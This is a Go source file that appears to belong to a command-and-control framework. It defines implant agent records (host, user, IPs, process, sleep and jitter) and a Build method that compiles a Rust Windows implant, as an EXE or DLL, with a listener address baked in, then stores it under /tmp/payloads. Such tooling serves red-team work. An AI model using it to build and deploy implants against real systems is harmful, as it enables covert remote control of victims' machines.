package agents

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

type NewAgentRequest struct {
	Name     string `json:"name"`
	Listener string `json:"listener"`
	Arch     string `json:"arch"`
	Format   string `json:"format"`
}

type AgentRegisterData struct {
	Arch        string `json:"arch"`
	Platform    string `json:"platform"`
	Hostname    string `json:"hostname"`
	User        string `json:"username"`
	InternalIp  string `json:"ip"`
	Pid         int64  `json:"pid"`
	ProcessName string `json:"process_name"`
	Sleep       int    `json:"sleep"`
	Jitter      int    `json:"jitter"`
}

type Agent struct {
	Id       string `json:"id"`
	Name     string `json:"name"`
	Listener string `json:"listener"`
	Status   string `json:"status"`
	Arch     string `json:"arch"`
	Format   string `json:"format"`
	// Sleep and jitter?
	Timestamp int64  `json:"timestamp"`
	LastPing  string `json:"last_ping"`
	// WorkingTime string `json:"working_time"`
	// KillDate int64  `json:"kill_date"`
	Platform    string `json:"platform"`
	Hostname    string `json:"hostname"`
	User        string `json:"user"`
	InternalIp  string `json:"internal_ip"`
	PublicIp    string `json:"public_ip"`
	Pid         int64  `json:"pid,omitempty"`
	ProcessName string `json:"process"`
	Sleep       int    `json:"sleep"`
	Jitter      int    `json:"jitter"`
	// TODO: cycling uris
	// Uris      []string `json:"uris"`
}

// TODO:
// will fix this later to make it malleable
// for now just need to automate the build process
func (a *Agent) Build() (*string, error) {

	target := "x86_64-pc-windows-gnu"

	implantDir := os.Getenv("IMPLANT_SOURCE_PATH")
	if implantDir == "" {
		// for test
		implantDir = "../implant"
	}

	environ := []string{
		"LISTENER_ADDRESS=" + a.Listener,
		"SESSION_ID=" + a.Id,
	}

	args := []string{
		"build",
		"--release",
		"--target",
		target,
	}

	features := []string{"http"}
	if a.Format == ".dll" {
		features = append(features, "dll")
		args = append(args, "--lib")
	}
	featuresStr := strings.Join(features, ",")

	args = append(args, "--features", featuresStr)

	cmd := exec.Command("cargo", args...)

	cmd.Env = append(os.Environ(), environ...)
	cmd.Dir = implantDir

	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("compilation failed out: %s - err: %w", string(output), err)
	}

	binaryPath := filepath.Join(implantDir, "target", target, "release", "implant"+a.Format)

	err := os.MkdirAll("/tmp/payloads", os.ModePerm)
	if err != nil {
		return nil, err
	}

	destPath := "/tmp/payloads/" + a.Name + a.Format
	src, err := os.Open(binaryPath)
	if err != nil {
		return nil, err
	}
	defer src.Close()
	dst, err := os.Create(destPath)
	if err != nil {
		return nil, err
	}
	defer dst.Close()
	if _, err = io.Copy(dst, src); err != nil {
		return nil, err
	}
	src.Close()
	os.Remove(binaryPath)

	agent := a.Name + a.Format

	return &agent, nil
}
